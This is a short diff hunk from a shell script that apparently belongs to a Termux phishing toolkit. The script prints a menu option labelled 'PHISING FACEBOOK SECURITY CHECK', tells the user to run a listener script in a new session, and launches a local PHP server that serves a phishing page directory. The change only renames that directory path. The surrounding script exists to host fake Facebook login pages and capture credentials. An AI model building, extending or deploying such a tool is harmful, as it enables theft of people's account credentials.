@@ -65,7 +65,7 @@ echo $pur"now open new session and run listen.sh"
 echo $ku"__________________________________"
 sleep 1
 echo $pur"  PHISING FACEBOOK SECURITY CHECK  "
-php -S localhost:8080 -t /data/data/com.termux/files/home/TODPHISH/V1
+php -S localhost:8080 -t /data/data/com.termux/files/home/termux-phising/V1
 fi
 
 if [ $pil = 3 ]
